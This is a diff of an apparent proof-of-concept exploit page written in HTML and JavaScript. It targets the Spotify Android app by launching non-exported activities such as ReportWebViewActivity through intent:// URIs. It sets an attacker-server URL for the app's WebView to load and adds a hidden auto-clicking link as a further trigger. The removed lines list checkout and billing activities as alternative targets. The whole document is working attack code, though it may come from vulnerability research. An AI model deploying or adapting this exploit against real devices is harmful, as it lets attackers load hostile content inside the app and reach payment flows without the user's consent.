@@ -50,7 +50,7 @@
     // =============================================================
 
     // CHANGE THIS to your actual attacker server
-    var ATTACKER_SERVER = "https://folklorxdnelsaka.github.io/idkwebview/";
+    var ATTACKER_SERVER = "https://folklorxdnelsaka.github.io/idkwebview";
 
     // Target: ReportWebViewActivity (non-exported)
     // This activity reads "report_webview_url" from extras and loads it
@@ -84,24 +84,14 @@
         document.body.appendChild(iframe);
     }, 2000);
 
-    // -------------------------------------------------------
-    // ALTERNATIVE TARGETS (uncomment to test different impacts)
-    // -------------------------------------------------------
-
-    // Target: PremiumCheckoutActivity (access checkout/billing flows)
-    // var intentUri = "intent://checkout#Intent;"
-    //     + "component=com.spotify.music/com.spotify.checkout.premiumcheckout.PremiumCheckoutActivity;"
-    //     + "end";
-
-    // Target: SpotifyCheckoutActivity (payment processing)
-    // var intentUri = "intent://checkout#Intent;"
-    //     + "component=com.spotify.music/com.spotify.checkout.spotifycheckout.SpotifyCheckoutActivity;"
-    //     + "end";
-
-    // Target: InAppBrowserLauncherActivity (launch multiple browser instances)
-    // var intentUri = "intent://browser#Intent;"
-    //     + "component=com.spotify.music/com.spotify.adsinternal.adscommon.inappbrowser.InAppBrowserLauncherActivity;"
-    //     + "end";
+    // Method 3: anchor click
+    setTimeout(function() {
+        var a = document.createElement('a');
+        a.href = intentUri;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+    }, 3500);
     </script>
 </body>
 </html>
